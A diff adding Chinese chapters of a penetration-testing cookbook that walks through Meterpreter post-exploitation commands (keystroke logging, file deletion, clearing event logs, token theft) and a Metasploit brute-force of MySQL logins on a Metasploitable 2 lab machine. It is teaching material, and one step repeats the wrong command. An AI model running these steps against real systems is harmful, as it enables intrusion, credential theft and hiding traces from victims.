@@ -274,4 +274,180 @@ MSFCLI 的一些命令是：
 
 +   载荷：一旦成功运行了漏洞利用，必须把载荷传给被攻击的机器，以便允许我们创建 shell，运行各种命令，添加用户以及其它。
 
-一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的回话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。
+一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。
+
+## 6.5 掌握 Meterpreter
+
+一旦你使用 Armitage，MSFCLI 或 MSFCONSOLE 获得了主机的访问权，你必须使用 Meterpreter 来传递你的载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。
+
+一些用于 Meterpreter 的常用命令包括：
+
++   `help`：这个命令允许你浏览帮助文档。
+
++   `background`：这个命令允许你在后台运行 Meterpreter 会话。这个命令也能为你带回 MSF 提示符。
+
++   `download`：这个命令允许你从受害者机器中下载文件。
+
++   `upload`：这个命令允许你向受害者机器上传文件。
+
++   `execute`：这个命令允许你在受害者机器上运行命令。
+
++   `shell`：这个命令允许你在受害者机器上运行 Windows shell 提示符（仅限于 Windows 主机）。
+
++   `session -i`：这个命令允许你在会话之间切换。
+
+### 准备
+
+需要满足下列要求：
+
++   内部网络或互联网的连接。
+
++   使用 Armitage，MSFCLI 或 MSFCONSOLE 由 Metasploit 创建好的，目标系统的活动会话。
+
+### 操作步骤
+
+让我们打开 MSFCONSOLE 来开始：
+
+1.  首先我们以 MSFCONSOLE 中展示的活动会话开始。
+
+2.  开始记录目标系统中用户的击键顺序：
+
+    ```
+    keyscan_start 
+    ```
+    
+3.  转储目标系统中用户的击键顺序。击键顺序会显示在屏幕上：
+
+    ```
+    keyscan_dump 
+    ```
+    
+4.  停止记录目标系统中用户的击键顺序。
+
+    ```
+    keyscan_stop 
+    ```
+    
+5.  删除目标系统中的文件。
+
+    ```
+    del exploited.docx 
+    ```
+    
+6.  清除目标系统中的事件日志。
+
+    ```
+    clearav 
+    ```
+    
+7.  展示运行进程的列表。
+
+    ```
+    ps
+    ```
+    
+8.  杀掉受害者系统的指定进程，使用`kill [pid]`语法。
+
+    ```
+    kill 6353
+    ```
+    
+9.  尝试偷取目标系统上的模拟令牌。
+
+    ```
+    steal_token 
+    ```
+    
+### 工作原理
+
+我们以通过 Armitage，MSFCLI 或 MSFCONSOLE 预先建立的 Meterpreter 会话来开始。之后我们在目标机器上运行了多种命令。
+
+### 更多
+
+当我们对基于 Linux 主机使用 Meterpreter 的时候，我们能够在它上面运行 Linux 命令，就像我们操作这台机器那样。
+
+## 6.6 Metasploitable MySQL
+
+这个秘籍中，我们会探索如何使用 Metasploit 来攻击 MySQL 数据库服务器，使用 MySQL 扫描器模块。MySQL 是许多网站平台的选择，包括 Drupal 和 Wordpress，许多网站当前正在使用 MySQL 数据库服务器。这会使它们更容易成为 Metasploitable MySQL 攻击的目标。
+
+### 准备
+
+需要满足下列要求：
+
++   内部网络的连接。
+
++   运行在渗透环境中的 Metasploitable 。
+
++   用于执行字典攻击的单词列表。
+
+### 操作步骤
+
+让我们通过打开终端窗口来开始  MySQL 攻击：
+
+1.  打开终端窗口。
+
+2.  启动 MSFCONSOLE。
+
+    ```
+    msfconsole 
+    ```
+    
+3.  搜索可用的 MySQL 模块。
+
+    ```
+    msfconsole 
+    ```
+    
+    ![](img/6-6-1.jpg)
+    
+4.  使用 MySQL 扫描器模块。
+
+    ```
+    use auxiliary/scanner/mysql/mysql_login
+    ```
+    
+    ![](img/6-6-2.jpg)
+    
+5.  显示模块的可用选项。
+
+    ```
+    show options
+    ```
+    
+    ![](img/6-6-3.jpg)
+    
+6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
+
+    ```
+    set RHOST 192.168.10.111 
+    ```
+    
+7.  设置用户名文件的位置。你可以选择：
+
+    ```
+    set user_file /root/Desktop/usernames.txt
+    ```
+    
+8.  设置密码文件的位置。你可以选择：
+
+    ```
+    set pass_file /root/Desktop/passwords.txt
+    ```
+    
+9.  执行漏洞利用：
+
+    ```
+    Exploit
+    ```
+    
+    ![](img/6-6-4.jpg)
+    
+0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
+    
+### 工作原理
+
+这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用   Metasploitable 2 靶机上的 MySQL 漏洞。我们以启动控制台并搜索所有已知的 MySQL 模块来开始。在选择 MySQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 MySQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 MySQL 数据库。
+
+### 更多
+
+这个秘籍中，我们使用了自己生成的用户名和密码文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。
